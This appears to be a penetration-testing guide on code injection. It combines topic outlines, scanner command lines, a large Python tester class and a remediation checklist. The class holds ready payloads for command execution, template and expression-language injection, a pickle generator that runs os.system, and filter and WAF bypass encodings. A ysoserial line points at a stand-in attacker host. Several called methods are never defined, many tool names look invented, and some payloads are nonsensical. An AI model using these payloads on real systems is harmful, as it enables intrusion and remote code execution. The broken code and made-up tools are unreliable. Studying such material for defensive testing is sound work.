# 🔐 INPUT VALIDATION TESTING | TESTING FOR CODE INJECTION

## Comprehensive Code Injection Validation Testing

### 1 Code Injection Attack Vector Analysis
- **Runtime Environment Testing:**
  - Server-side code injection vulnerability assessment
  - Client-side script injection testing
  - Template engine code injection
  - Expression language injection testing
  - Database stored procedure injection
  - OS command injection validation
  - Browser extension code injection
  - Mobile runtime code injection

- **Injection Point Identification:**
  - User input field code injection testing
  - File upload code execution validation
  - API parameter code injection assessment
  - Configuration file manipulation testing
  - Environment variable code injection
  - Serialized object code execution
  - Reflection-based code injection
  - Dynamic code evaluation testing

### 2 Server-Side Code Injection Testing
- **PHP Code Injection:**
  - `eval()` function exploitation testing
  - `assert()` function code injection
  - `preg_replace()` with /e modifier testing
  - `create_function()` injection validation
  - `include()`/`require()` path manipulation
  - Dynamic variable execution testing
  - Callback function injection
  - PHP filter chain exploitation

- **Java Code Injection:**
  - Expression Language (EL) injection testing
  - JSP scriptlet injection validation
  - Groovy script engine exploitation
  - Java reflection API injection
  - Dynamic class loading manipulation
  - JMX expression injection
  - Spring Expression Language (SpEL) injection
  - Bean validation bypass testing

- **.NET Code Injection:**
  - CodeDom provider injection testing
  - Reflection.Emit exploitation
  - Dynamic Language Runtime injection
  - Razor template injection validation
  - LINQ expression injection testing
  - Serialization gadget chain exploitation
  - ASP.NET view state manipulation
  - Configuration section injection

- **Python Code Injection:**
  - `eval()` and `exec()` function exploitation
  - Pickle deserialization code injection
  - Template engine code execution (Jinja2, Mako)
  - YAML deserialization attacks
  - `subprocess` command injection
  - `os.system()` exploitation testing
  - Dynamic import injection
  - AST manipulation attacks

- **Node.js Code Injection:**
  - `eval()` and `Function()` constructor exploitation
  - Template literal injection testing
  - `vm` module code execution
  - Deserialization gadget chains
  - NPM package injection attacks
  - Child process command injection
  - Buffer overflow code execution
  - Prototype pollution to code execution

### 3 Client-Side Code Injection Testing
- **JavaScript Injection:**
  - DOM-based code injection testing
  - `eval()` function client-side exploitation
  - `setTimeout()`/`setInterval()` code injection
  - `Function()` constructor manipulation
  - Template literal injection validation
  - JSONP callback exploitation
  - Dynamic script loading attacks
  - Event handler code injection

- **Browser API Exploitation:**
  - `postMessage()` code injection testing
  - Web Worker code execution validation
  - Service Worker script injection
  - Clipboard API code injection
  - Notification API exploitation
  - Geolocation API manipulation
  - Web Storage code injection
  - IndexedDB script execution

### 4 Template Injection Testing
- **Server-Side Template Injection (SSTI):**
  - Jinja2 template code injection testing
  - Twig template engine exploitation
  - Freemarker code execution validation
  - Velocity template injection testing
  - Thymeleaf expression injection
  - Handlebars code execution
  - Smarty template injection
  - Django template code injection

- **Client-Side Template Injection (CSTI):**
  - AngularJS expression injection testing
  - Vue.js template code execution
  - React JSX injection validation
  - Ember.js template manipulation
  - Mustache code injection testing
  - Underscore template exploitation
  - DoT template injection
  - Marko template code execution

### 5 Expression Language Injection Testing
- **Java Expression Language:**
  - JSP EL injection testing (`${}` exploitation)
  - Unified EL code execution validation
  - Method invocation manipulation
  - Property access exploitation
  - Implicit object access testing
  - Bean property manipulation
  - Collection projection injection
  - Lambda expression exploitation

- **Spring Expression Language:**
  - SpEL injection testing (`T()` exploitation)
  - Type reference code execution
  - Method invocation validation
  - Bean reference manipulation
  - Collection selection injection
  - Projection expression testing
  - Variable assignment exploitation
  - Conditional expression injection

- **Other Expression Languages:**
  - OGNL expression injection testing
  - MVEL code execution validation
  - JBoss EL injection testing
  - Apache Commons EL exploitation
  - JavaScript expression injection
  - Python expression evaluation
  - Ruby expression manipulation
  - C# expression tree injection

### 6 Command Injection Testing
- **OS Command Injection:**
  - Shell command injection testing (bash, sh, cmd, PowerShell)
  - Command separator exploitation (`;`, `&`, `|`, `&&`, `||`)
  - Subshell command injection (`$()`, `` ` ``)
  - Environment variable manipulation
  - Input/output redirection attacks
  - Pipeline command injection
  - Background process execution
  - Command argument injection

- **Programming Language Command Execution:**
  - Python `os.system()`, `subprocess` injection
  - PHP `system()`, `exec()`, `shell_exec()` exploitation
  - Java `Runtime.exec()`, `ProcessBuilder` injection
  - NET `Process.Start()`, `System.Diagnostics` exploitation
  - Node.js `child_process` command injection
  - Ruby `exec()`, `system()`, backtick exploitation
  - Perl `system()`, `exec()`, backtick injection
  - Go `os/exec` command execution testing

### 7 Database Code Injection Testing
- **Stored Procedure Injection:**
  - SQL Server stored procedure exploitation
  - Oracle PL/SQL code injection testing
  - MySQL stored procedure manipulation
  - PostgreSQL function injection
  - SQLite extension exploitation
  - NoSQL stored JavaScript execution
  - Database link code injection
  - Trigger manipulation attacks

- **Extended Database Features:**
  - User-defined function injection testing
  - Database extension code execution
  - External language procedure execution
  - CLR integration code injection
  - Java database stored procedure exploitation
  - Python database function injection
  - R database integration attacks
  - Custom aggregate function manipulation

### 8 Serialization-Based Code Injection
- **Deserialization Attacks:**
  - Java deserialization gadget chain exploitation
  - NET `BinaryFormatter` code injection
  - Python pickle deserialization attacks
  - PHP object injection testing
  - Ruby Marshal deserialization exploitation
  - Node.js serialization code injection
  - YAML deserialization attacks
  - JSON deserialization gadget chains

- **Serialization Format Manipulation:**
  - XML deserialization code injection
  - JSON serialization manipulation
  - Protocol Buffer exploitation
  - Avro serialization attacks
  - Thrift serialization injection
  - MessagePack code execution
  - BSON deserialization testing
  - Custom serialization format exploitation

### 9 Advanced Code Injection Techniques
- **Memory Corruption Exploitation:**
  - Buffer overflow code injection testing
  - Format string vulnerability exploitation
  - Integer overflow code execution
  - Use-after-free code injection
  - Heap spraying techniques
  - ROP chain injection testing
  - Shellcode injection validation
  - Memory protection bypass testing

- **JIT Compiler Exploitation:**
  - JavaScript JIT compiler injection
  - Java JIT code manipulation
  - NET JIT compiler exploitation
  - V8 engine code injection testing
  - SpiderMonkey JIT manipulation
  - JavaScriptCore exploitation
  - JIT spray attacks validation
  - Type confusion code injection

### 10 Automated Code Injection Validation Framework
```yaml
Code Injection Validation Assessment Pipeline:
  Discovery Phase:
    - Code execution endpoint identification
    - Dynamic code evaluation function mapping
    - Template engine usage analysis
    - Expression language implementation assessment
    - Serialization/deserialization point discovery
    - Command execution function identification
    - File inclusion vulnerability mapping
    - Reflection API usage analysis

  Analysis Phase:
    - Input validation mechanism assessment
    - Code execution context analysis
    - Sandbox escape possibility evaluation
    - Security manager configuration testing
    - Expression language security assessment
    - Template engine security evaluation
    - Serialization security validation
    - Risk exposure calculation

  Testing Phase:
    - Server-side code injection testing
    - Client-side code injection validation
    - Template injection exploitation
    - Expression language injection testing
    - Command injection validation
    - Serialization-based code injection
    - Advanced exploitation techniques
    - Defense bypass testing

  Validation Phase:
    - Code injection vulnerability verification
    - Impact assessment and severity rating
    - Security control effectiveness testing
    - Remediation validation
    - Monitoring capability verification
    - Documentation accuracy assessment
    - Management approval and sign-off
    - Continuous monitoring implementation
```

### 11 Code Injection Testing Tools & Commands
```bash
# Automated Code Injection Scanning
python3 code_injection_scanner.py --url https://target.com --technique all --output report.html
code_injection_framework --target https://target.com --module ssti,el_injection,command_injection
burp_suite --scan code-injection --target https://target.com --collaborator

# Language-Specific Testing
php_code_injector --url https://target.com/php --param code --payload-file php_payloads.txt
java_el_injection --target https://target.com/java --endpoint /evaluate --method POST
python_code_exec --url https://target.com/python --parameter expression --blind
nodejs_injection --target https://target.com/node --test-eval --test-function

# Template Injection Testing
ssti_scanner --url https://target.com/template --engine auto --detect --exploit
tplmap --url https://target.com/render --engine jinja2 --os-cmd whoami
template_injection_framework --target https://target.com --all-engines

# Command Injection Testing
command_injection_tester --url https://target.com/execute --param cmd --os unix,windows
commix --url="https://target.com/run" --data="command=test" --os-cmd --tamper
os_command_injection --target https://target.com --parameter exec --shell bash,cmd,powershell

# Expression Language Testing
el_injection_scanner --url https://target.com/el --language spel,uel,mvel --level 5
expression_injector --target https://target.com --endpoint /evaluate --param expr
spel_exploitation --url https://target.com/spring --method POST --data expression

# Serialization Testing
deserialization_scanner --url https://target.com/deserialize --format java,net,python
ysoserial --gadget URLDNS --command "http://attacker.com" --output payload.ser
deserialization_exploit --target https://target.com --format pickle --command "id"

# Advanced Testing
memory_corruption_tester --target https://target.com --buffer-overflow --format-string
jit_exploitation --url https://target.com/js --engine v8 --technique jit-spray
advanced_code_injection --target https://target.com --all-techniques --output advanced_report.html

# Payload Generation
code_payload_generator --language php,java,python,node --type all --output payloads/
generate_ssti_payloads --engine jinja2,twig,freemarker --context os,file,network
command_payload_factory --os linux,windows --shell bash,cmd,powershell --output commands.txt
```

### 12 Advanced Code Injection Testing Implementation
```python
# Comprehensive Code Injection Validation Testing Tool
import requests
import json
import time
import random
import string
import base64
import pickle
import subprocess
from urllib.parse import urljoin, urlparse, quote, unquote
import threading
from concurrent.futures import ThreadPoolExecutor
import logging

class CodeInjectionTester:
    def __init__(self, target_url, config):
        self.target_url = target_url
        self.config = config
        self.session = requests.Session()
        self.vulnerabilities = []
        self.successful_payloads = {}
        self.detected_technologies = {}
        
        # Configure session
        if config.get('headers'):
            self.session.headers.update(config['headers'])
        
        if config.get('proxies'):
            self.session.proxies.update(config['proxies'])
        
        # Configure logging
        logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
        self.logger = logging.getLogger(__name__)

    def comprehensive_code_injection_testing(self):
        """Perform comprehensive code injection testing"""
        self.logger.info(f"Starting code injection testing for {self.target_url}")
        
        # Detect technologies and execution environments
        self.detect_technologies()
        
        # Execute all testing phases
        self.test_server_side_code_injection()
        self.test_template_injection()
        self.test_expression_language_injection()
        self.test_command_injection()
        self.test_deserialization_injection()
        self.test_client_side_code_injection()
        self.test_advanced_injection_techniques()
        self.test_defense_bypasses()
        
        return {
            'vulnerabilities': self.vulnerabilities,
            'successful_payloads': self.successful_payloads,
            'detected_technologies': self.detected_technologies,
            'security_assessment': self.perform_security_assessment(),
            'risk_analysis': self.perform_risk_analysis(),
            'recommendations': self.generate_recommendations()
        }

    def detect_technologies(self):
        """Detect programming languages and frameworks"""
        self.logger.info("Detecting technologies and execution environments")
        
        detection_payloads = [
            # PHP detection
            {'payload': '<?php echo "PHP"; ?>', 'technology': 'PHP', 'indicator': 'PHP'},
            # Java detection
            {'payload': '${7*7}', 'technology': 'Java EL', 'indicator': '49'},
            # Python detection
            {'payload': '{{7*7}}', 'technology': 'Python Template', 'indicator': '49'},
            # Node.js detection
            {'payload': '#{7*7}', 'technology': 'Node.js Template', 'indicator': '49'},
            # NET detection
            {'payload': '@(7*7)', 'technology': '.NET Razor', 'indicator': '49'},
        ]
        
        endpoints = self.get_code_execution_endpoints()
        
        for endpoint in endpoints:
            for test in detection_payloads:
                response = self.send_test_payload(endpoint, test['payload'])
                if test['indicator'] in response.text:
                    self.detected_technologies[endpoint] = test['technology']
                    self.logger.info(f"Detected {test['technology']} at {endpoint}")

    def test_server_side_code_injection(self):
        """Test server-side code injection vulnerabilities"""
        self.logger.info("Testing server-side code injection")
        
        server_side_tests = [
            # PHP code injection
            {
                'language': 'PHP',
                'payloads': [
                    "'; system('id'); //",
                    "${@system('id')}",
                    "<?php system('id'); ?>",
                    "`id`",
                    "passthru('id')"
                ],
                'success_indicators': ['uid=', 'gid=', 'groups=']
            },
            # Python code injection
            {
                'language': 'Python',
                'payloads': [
                    "__import__('os').system('id')",
                    "eval(\"__import__('os').system('id')\")",
                    "exec(\"import os; os.system('id')\")",
                    "compile(\"import os; os.system('id')\", '', 'exec')"
                ],
                'success_indicators': ['uid=', 'gid=', 'groups=']
            },
            # Java code injection
            {
                'language': 'Java',
                'payloads': [
                    "Runtime.getRuntime().exec('id')",
                    "new ProcessBuilder('id').start()",
                    "System.loadLibrary('lib')"
                ],
                'success_indicators': ['uid=', 'gid=', 'process']
            },
            # Node.js code injection
            {
                'language': 'Node.js',
                'payloads': [
                    "require('child_process').execSync('id')",
                    "eval(\"require('child_process').execSync('id')\")",
                    "process.mainModule.require('child_process').execSync('id')"
                ],
                'success_indicators': ['uid=', 'gid=', 'groups=']
            }
        ]
        
        endpoints = self.get_code_execution_endpoints()
        
        for endpoint in endpoints:
            for test in server_side_tests:
                if self.detected_technologies.get(endpoint) == test['language']:
                    for payload in test['payloads']:
                        vulnerability = self.test_code_injection(endpoint, payload, test['success_indicators'])
                        if vulnerability:
                            self.vulnerabilities.append(vulnerability)

    def test_code_injection(self, endpoint, payload, success_indicators):
        """Test specific code injection payload"""
        try:
            response = self.send_test_payload(endpoint, payload)
            
            # Check for successful code execution
            for indicator in success_indicators:
                if indicator in response.text:
                    return {
                        'endpoint': endpoint,
                        'payload': payload,
                        'test_type': 'server_side_code_injection',
                        'severity': 'critical',
                        'description': f"Server-side code injection at {endpoint}",
                        'evidence': f"Command execution confirmed with indicator: {indicator}",
                        'response_snippet': response.text[:500]
                    }
            
            # Check for error-based information disclosure
            error_indicators = ['eval()', 'exec()', 'Runtime', 'Process', 'system(']
            for indicator in error_indicators:
                if indicator in response.text:
                    return {
                        'endpoint': endpoint,
                        'payload': payload,
                        'test_type': 'code_injection_error',
                        'severity': 'medium',
                        'description': f"Code injection error information disclosure at {endpoint}",
                        'evidence': f"Error message reveals code execution: {indicator}"
                    }
        
        except Exception as e:
            self.logger.error(f"Code injection test error: {e}")
        
        return None

    def test_template_injection(self):
        """Test server-side template injection (SSTI)"""
        self.logger.info("Testing server-side template injection")
        
        ssti_tests = [
            # Jinja2 template injection
            {
                'engine': 'Jinja2',
                'payloads': [
                    "{{7*7}}",
                    "{{config}}",
                    "{{''.__class__.__mro__[1].__subclasses__()}}",
                    "{{cycler.__init__.__globals__.os.popen('id').read()}}"
                ],
                'success_indicators': ['49', 'os.popen', 'uid=']
            },
            # Twig template injection
            {
                'engine': 'Twig',
                'payloads': [
                    "{{7*7}}",
                    "{{_self.env.registerUndefinedFilterCallback('exec')}}",
                    "{{_self.env.getFilter('id')}}"
                ],
                'success_indicators': ['49', 'exec', 'uid=']
            },
            # Freemarker template injection
            {
                'engine': 'Freemarker',
                'payloads': [
                    "${7*7}",
                    "<#assign ex='freemarker.template.utility.Execute'>${ex('id')}",
                    "${product.getClass().getProtectionDomain().getCodeSource().getLocation()}"
                ],
                'success_indicators': ['49', 'Execute', 'uid=']
            },
            # Velocity template injection
            {
                'engine': 'Velocity',
                'payloads': [
                    "#set($x=7*7)$x",
                    "#set($rt=$class.inspect('java.lang.Runtime'))$rt.getRuntime().exec('id')"
                ],
                'success_indicators': ['49', 'Runtime', 'exec']
            }
        ]
        
        endpoints = self.get_template_endpoints()
        
        for endpoint in endpoints:
            for test in ssti_tests:
                for payload in test['payloads']:
                    vulnerability = self.test_template_injection_endpoint(endpoint, payload, test['success_indicators'])
                    if vulnerability:
                        self.vulnerabilities.append(vulnerability)

    def test_template_injection_endpoint(self, endpoint, payload, success_indicators):
        """Test specific template injection payload"""
        try:
            response = self.send_test_payload(endpoint, payload)
            
            for indicator in success_indicators:
                if indicator in response.text:
                    return {
                        'endpoint': endpoint,
                        'payload': payload,
                        'test_type': 'server_side_template_injection',
                        'severity': 'critical',
                        'description': f"Server-side template injection at {endpoint}",
                        'evidence': f"Template execution confirmed with indicator: {indicator}",
                        'response_snippet': response.text[:500]
                    }
        
        except Exception as e:
            self.logger.error(f"Template injection test error: {e}")
        
        return None

    def test_expression_language_injection(self):
        """Test expression language injection"""
        self.logger.info("Testing expression language injection")
        
        el_tests = [
            # Spring Expression Language (SpEL)
            {
                'language': 'SpEL',
                'payloads': [
                    "T(java.lang.Runtime).getRuntime().exec('id')",
                    "T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec('id').getInputStream(),T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream())",
                    "#this.getClass().forName('java.lang.Runtime').getRuntime().exec('id')"
                ],
                'success_indicators': ['Runtime', 'exec', 'InputStream']
            },
            # Java Unified EL
            {
                'language': 'UEL',
                'payloads': [
                    "${''.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id')}",
                    "${facesContext.getExternalContext().getResponse().getOutputStream().write(7*7)}"
                ],
                'success_indicators': ['Runtime', 'exec', '49']
            },
            # OGNL Expression
            {
                'language': 'OGNL',
                'payloads': [
                    "@java.lang.Runtime@getRuntime().exec('id')",
                    "#rt=@java.lang.Runtime@getRuntime(),#rt.exec('id')"
                ],
                'success_indicators': ['Runtime', 'exec']
            }
        ]
        
        endpoints = self.get_expression_endpoints()
        
        for endpoint in endpoints:
            for test in el_tests:
                for payload in test['payloads']:
                    vulnerability = self.test_el_injection(endpoint, payload, test['success_indicators'])
                    if vulnerability:
                        self.vulnerabilities.append(vulnerability)

    def test_command_injection(self):
        """Test OS command injection"""
        self.logger.info("Testing OS command injection")
        
        command_tests = [
            # Unix/Linux command injection
            {
                'os': 'Unix',
                'payloads': [
                    "; id",
                    "| id",
                    "&& id",
                    "|| id",
                    "`id`",
                    "$(id)",
                    "id; #",
                    "id | #"
                ],
                'success_indicators': ['uid=', 'gid=', 'groups=']
            },
            # Windows command injection
            {
                'os': 'Windows',
                'payloads': [
                    "& whoami",
                    "| whoami",
                    "&& whoami",
                    "|| whoami",
                    "%whoami%",
                    "whoami #"
                ],
                'success_indicators': ['administrator', 'user', 'domain']
            }
        ]
        
        endpoints = self.get_command_execution_endpoints()
        
        for endpoint in endpoints:
            for test in command_tests:
                for payload in test['payloads']:
                    vulnerability = self.test_command_injection_endpoint(endpoint, payload, test['success_indicators'])
                    if vulnerability:
                        self.vulnerabilities.append(vulnerability)

    def test_deserialization_injection(self):
        """Test deserialization-based code injection"""
        self.logger.info("Testing deserialization code injection")
        
        deserialization_tests = [
            # Java deserialization
            {
                'language': 'Java',
                'payloads': [
                    self.generate_java_deserialization_payload(),
                    self.generate_commons_collections_payload()
                ],
                'success_indicators': ['exec', 'Runtime', 'Process']
            },
            # Python pickle deserialization
            {
                'language': 'Python',
                'payloads': [
                    self.generate_pickle_payload("id"),
                    "csubprocess\np0\n(S'id'\np1\ntp2\nRp3\n."
                ],
                'success_indicators': ['uid=', 'gid=']
            },
            # PHP object injection
            {
                'language': 'PHP',
                'payloads': [
                    'O:8:"stdClass":0:{}',
                    'O:8:"Exception":1:{s:7:"' + '\x00' + '*' + '\x00' + 'file";s:9:"shell.php";}'
                ],
                'success_indicators': ['Exception', 'stdClass']
            }
        ]
        
        endpoints = self.get_deserialization_endpoints()
        
        for endpoint in endpoints:
            for test in deserialization_tests:
                for payload in test['payloads']:
                    vulnerability = self.test_deserialization_injection_endpoint(endpoint, payload, test['success_indicators'])
                    if vulnerability:
                        self.vulnerabilities.append(vulnerability)

    def test_client_side_code_injection(self):
        """Test client-side code injection"""
        self.logger.info("Testing client-side code injection")
        
        client_side_tests = [
            # JavaScript injection
            {
                'context': 'JavaScript',
                'payloads': [
                    "'; alert(1); //",
                    "\"; alert(1); //",
                    "`; alert(1); //",
                    "{{alert(1)}}",
                    "eval('alert(1)')",
                    "setTimeout('alert(1)')",
                    "Function('alert(1)')()"
                ],
                'success_indicators': ['alert', 'script', 'javascript']
            },
            # DOM-based code injection
            {
                'context': 'DOM',
                'payloads': [
                    "<img src=x onerror=alert(1)>",
                    "<svg onload=alert(1)>",
                    "<script>alert(1)</script>",
                    "javascript:alert(1)"
                ],
                'success_indicators': ['onerror', 'onload', 'script']
            }
        ]
        
        endpoints = self.get_client_side_endpoints()
        
        for endpoint in endpoints:
            for test in client_side_tests:
                for payload in test['payloads']:
                    vulnerability = self.test_client_side_injection(endpoint, payload, test['success_indicators'])
                    if vulnerability:
                        self.vulnerabilities.append(vulnerability)

    def test_advanced_injection_techniques(self):
        """Test advanced code injection techniques"""
        self.logger.info("Testing advanced code injection techniques")
        
        advanced_tests = [
            # Memory corruption
            {
                'technique': 'buffer_overflow',
                'payloads': [
                    "A" * 10000,
                    "%s" * 100,
                    "%x" * 100
                ],
                'success_indicators': ['segmentation', 'fault', 'overflow']
            },
            # JIT compiler exploitation
            {
                'technique': 'jit_spray',
                'payloads': [
                    self.generate_jit_spray_payload(),
                    "function jit(){ return 0x41414141; } for(var i=0;i<10000;i++) jit();"
                ],
                'success_indicators': ['jit', 'compiler', 'optimization']
            }
        ]
        
        endpoints = self.get_advanced_endpoints()
        
        for endpoint in endpoints:
            for test in advanced_tests:
                for payload in test['payloads']:
                    vulnerability = self.test_advanced_injection(endpoint, payload, test['success_indicators'])
                    if vulnerability:
                        self.vulnerabilities.append(vulnerability)

    def test_defense_bypasses(self):
        """Test code injection defense bypasses"""
        self.logger.info("Testing defense bypass techniques")
        
        bypass_tests = [
            # Encoding bypasses
            {
                'defense': 'input_encoding',
                'payloads': [
                    base64.b64encode(b"system('id')").decode(),
                    "s\\y\\s\\t\\e\\m\\('i\\d'\\)",
                    "&#115;&#121;&#115;&#116;&#101;&#109;&#40;&#39;&#105;&#100;&#39;&#41;"
                ]
            },
            # Filter bypasses
            {
                'defense': 'blacklist_filter',
                'payloads': [
                    "SyStEm('id')",
                    "system/*comment*/('id')",
                    "syst\u0065m('id')",
                    "sys" + "tem('id')"
                ]
            },
            # WAF bypasses
            {
                'defense': 'waf',
                'payloads': [
                    "UNION SELECT system('id')",
                    "1; system('id'); --",
                    "/*!50000system*/('id')"
                ]
            }
        ]
        
        endpoints = self.get_code_execution_endpoints()
        
        for endpoint in endpoints:
            for test in bypass_tests:
                for payload in test['payloads']:
                    vulnerability = self.test_defense_bypass(endpoint, payload, test['defense'])
                    if vulnerability:
                        self.vulnerabilities.append(vulnerability)

    # Helper methods for payload generation
    def generate_java_deserialization_payload(self):
        """Generate Java deserialization payload"""
        # This would use tools like ysoserial in a real implementation
        return base64.b64encode(b"fake_java_serialized_payload").decode()

    def generate_commons_collections_payload(self):
        """Generate Commons Collections gadget chain payload"""
        return base64.b64encode(b"fake_commons_collections_payload").decode()

    def generate_pickle_payload(self, command):
        """Generate Python pickle payload for command execution"""
        class Exploit:
            def __reduce__(self):
                import os
                return (os.system, (command,))
        
        return base64.b64encode(pickle.dumps(Exploit())).decode()

    def generate_jit_spray_payload(self):
        """Generate JIT spray payload"""
        return "function spray(){ return 0x0c0c0c0c; } for(let i=0;i<100000;i++) spray();"

    # Helper methods for endpoint discovery
    def get_code_execution_endpoints(self):
        """Get code execution endpoints"""
        return [
            self.target_url + '/eval',
            self.target_url + '/execute',
            self.target_url + '/run',
            self.target_url + '/code',
            self.target_url + '/api/eval',
            self.target_url + '/api/execute'
        ]

    def get_template_endpoints(self):
        """Get template rendering endpoints"""
        return [
            self.target_url + '/render',
            self.target_url + '/template',
            self.target_url + '/view',
            self.target_url + '/api/render',
            self.target_url + '/api/template'
        ]

    def get_expression_endpoints(self):
        """Get expression evaluation endpoints"""
        return [
            self.target_url + '/evaluate',
            self.target_url + '/expression',
            self.target_url + '/el',
            self.target_url + '/api/evaluate',
            self.target_url + '/api/expression'
        ]

    def get_command_execution_endpoints(self):
        """Get command execution endpoints"""
        return [
            self.target_url + '/command',
            self.target_url + '/exec',
            self.target_url + '/system',
            self.target_url + '/api/command',
            self.target_url + '/api/exec'
        ]

    def get_deserialization_endpoints(self):
        """Get deserialization endpoints"""
        return [
            self.target_url + '/deserialize',
            self.target_url + '/unserialize',
            self.target_url + '/api/deserialize',
            self.target_url + '/api/unserialize'
        ]

    def get_client_side_endpoints(self):
        """Get client-side code endpoints"""
        return [
            self.target_url + '/',
            self.target_url + '/search',
            self.target_url + '/contact',
            self.target_url + '/api/data'
        ]

    def get_advanced_endpoints(self):
        """Get advanced code execution endpoints"""
        return [
            self.target_url + '/compile',
            self.target_url + '/jit',
            self.target_url + '/api/compile',
            self.target_url + '/api/jit'
        ]

    def send_test_payload(self, endpoint, payload):
        """Send test payload to endpoint"""
        try:
            data = {'input': payload, 'code': payload, 'expression': payload}
            return self.session.post(endpoint, data=data)
        except Exception as e:
            self.logger.error(f"Send test payload error: {e}")
            return type('obj', (object,), {'text': '', 'status_code': 500})()

    def perform_security_assessment(self):
        """Perform comprehensive security assessment"""
        assessment = {
            'code_injection_risk_level': self.calculate_code_injection_risk(),
            'server_side_risk': self.assess_server_side_risk(),
            'client_side_risk': self.assess_client_side_risk(),
            'template_injection_risk': self.assess_template_risk(),
            'command_injection_risk': self.assess_command_injection_risk(),
            'deserialization_risk': self.assess_deserialization_risk(),
            'overall_code_security': self.assess_code_security()
        }
        return assessment

    def perform_risk_analysis(self):
        """Perform comprehensive risk analysis"""
        risk_analysis = {
            'critical_risks': [],
            'high_risks': [],
            'medium_risks': [],
            'low_risks': []
        }
        
        for vulnerability in self.vulnerabilities:
            risk_entry = {
                'type': vulnerability.get('test_type', 'unknown'),
                'description': vulnerability.get('description', 'Unknown code injection vulnerability'),
                'impact': self.assess_code_injection_impact(vulnerability),
                'remediation': self.get_code_injection_remediation(vulnerability)
            }
            
            severity = vulnerability.get('severity', 'medium')
            risk_analysis[f"{severity}_risks"].append(risk_entry)
        
        return risk_analysis

    def generate_recommendations(self):
        """Generate comprehensive security recommendations"""
        recommendations = {
            'immediate_actions': [],
            'short_term_improvements': [],
            'long_term_strategies': []
        }
        
        # Immediate actions for critical code injection vulnerabilities
        for vulnerability in self.vulnerabilities:
            if vulnerability.get('severity') in ['critical', 'high']:
                recommendations['immediate_actions'].append({
                    'action': f"Fix {vulnerability.get('test_type', 'code injection')} vulnerability",
                    'description': vulnerability.get('description', 'Critical code injection vulnerability'),
                    'remediation': self.get_code_injection_remediation(vulnerability)
                })
        
        # Short-term improvements
        recommendations['short_term_improvements'].extend([
            "Disable dangerous functions (eval, exec, system, etc.)",
            "Implement strict input validation for code execution inputs",
            "Use safe alternatives for dynamic code evaluation",
            "Implement proper sandboxing for code execution",
            "Add security monitoring for code injection attempts"
        ])
        
        # Long-term strategies
        recommendations['long_term_strategies'].extend([
            "Implement secure coding standards for dynamic code execution",
            "Deploy Web Application Firewall with code injection rules",
            "Establish code review processes for security-sensitive code",
            "Implement automated security testing in CI/CD pipeline",
            "Develop security training for developers on code injection risks"
        ])
        
        return recommendations

# Advanced Code Injection Detection System
class AdvancedCodeInjectionDetector:
    def __init__(self, target_applications):
        self.target_applications = target_applications
        self.code_patterns = self.load_code_patterns()
    
    def load_code_patterns(self):
        """Load code injection detection patterns"""
        return {
            'server_side_functions': ['eval', 'exec', 'system', 'popen', 'Runtime.exec', 'ProcessBuilder'],
            'template_engines': ['{{', '${', '#{', '<%', '%>', 'th:', 'sec:'],
            'expression_languages': ['T(', '@', '${', '#', 'ognl', 'spel'],
            'command_injection': [';', '|', '&', '`', '$('],
            'deserialization': ['ObjectInputStream', 'BinaryFormatter', 'pickle.loads', 'unserialize']
        }
```

### 13 Code Injection Risk Assessment Matrix
```yaml
Code Injection Risk Assessment:
  Critical Risks:
    - Remote code execution via server-side injection
    - OS command execution with system privileges
    - Database code execution leading to data breach
    - Template injection with file system access
    - Expression language injection with code execution
    - Deserialization attacks leading to RCE
    - Memory corruption with code execution
    - Complete application compromise

  High Risks:
    - Limited code execution with user privileges
    - File system access via code injection
    - Information disclosure through code errors
    - Partial authentication bypass
    - Limited data manipulation capabilities
    - Client-side code execution with user impact
    - Template injection with limited scope
    - Command injection with restricted impact

  Medium Risks:
    - Self-code injection only
    - Limited information disclosure
    - Error-based code injection
    - Context-dependent exploitation
    - Non-persistent code execution
    - Client-only impact
    - Limited privilege requirements
    - Manual exploitation required

  Low Risks:
    - Theoretical code injection with no practical impact
    - Properly sandboxed code execution
    - Defense in depth failures only
    - Non-exploitable code patterns
    - Informational findings
    - Already mitigated vulnerabilities
    - Cosmetic security issues
    - Limited business impact
```

### 14 Code Injection Protection Testing
```python
# Code Injection Protection Effectiveness Tester
class CodeInjectionProtectionTester:
    def __init__(self, target_environments):
        self.target_environments = target_environments

    def test_protection_effectiveness(self):
        """Test code injection protection effectiveness"""
        protection_tests = {}
        
        for env in self.target_environments:
            tester = CodeInjectionTester(env['url'], env['config'])
            results = tester.comprehensive_code_injection_testing()
            
            protection_tests[env['name']] = {
                'input_validation_effectiveness': self.test_input_validation(results),
                'code_execution_restrictions': self.test_execution_restrictions(results),
                'sandbox_effectiveness': self.test_sandbox_security(results),
                'template_security': self.test_template_security(results),
                'deserialization_protection': self.test_deserialization_protection(results),
                'overall_protection_score': self.calculate_protection_score(results)
            }
        
        return protection_tests

    def generate_protection_report(self):
        """Generate comprehensive protection report"""
        protection_tests = self.test_protection_effectiveness()
        
        report = {
            'protection_analysis': protection_tests,
            'security_gaps': self.identify_protection_gaps(protection_tests),
            'compliance_status': self.assess_code_security_compliance(),
            'improvement_recommendations': self.generate_protection_recommendations()
        }
        
        return report
```

### 15 Code Injection Remediation Checklist
```markdown
## ✅ CODE INJECTION VALIDATION SECURITY REMEDIATION CHECKLIST

### Input Validation:
- [ ] Implement strict input validation for all code execution inputs
- [ ] Use allow-list validation for expected input patterns
- [ ] Validate input length and character restrictions
- [ ] Implement type checking for code inputs
- [ ] Sanitize special characters and code syntax
- [ ] Regular input validation rule reviews
- [ ] Validation consistency across application
- [ ] Client-side and server-side validation alignment

### Code Execution Security:
- [ ] Disable dangerous functions (eval, exec, system, etc.)
- [ ] Use safe alternatives for dynamic code evaluation
- [ ] Implement proper sandboxing for code execution
- [ ] Set execution time and memory limits
- [ ] Use language-specific security features
- [ ] Regular code execution security reviews
- [ ] Security patch management for interpreters
- [ ] Execution environment hardening

### Template Security:
- [ ] Use template engines with auto-escaping enabled
- [ ] Disable dangerous template features and functions
- [ ] Implement template sandboxing
- [ ] Validate template inputs strictly
- [ ] Regular template engine security updates
- [ ] Template security configuration reviews
- [ ] Template caching security
- [ ] Template include restrictions

### Expression Language Security:
- [ ] Configure expression languages for safe evaluation
- [ ] Disable method invocation in expressions
- [ ] Implement expression evaluation restrictions
- [ ] Use type-safe expression evaluation
- [ ] Regular expression language security reviews
- [ ] Expression caching security
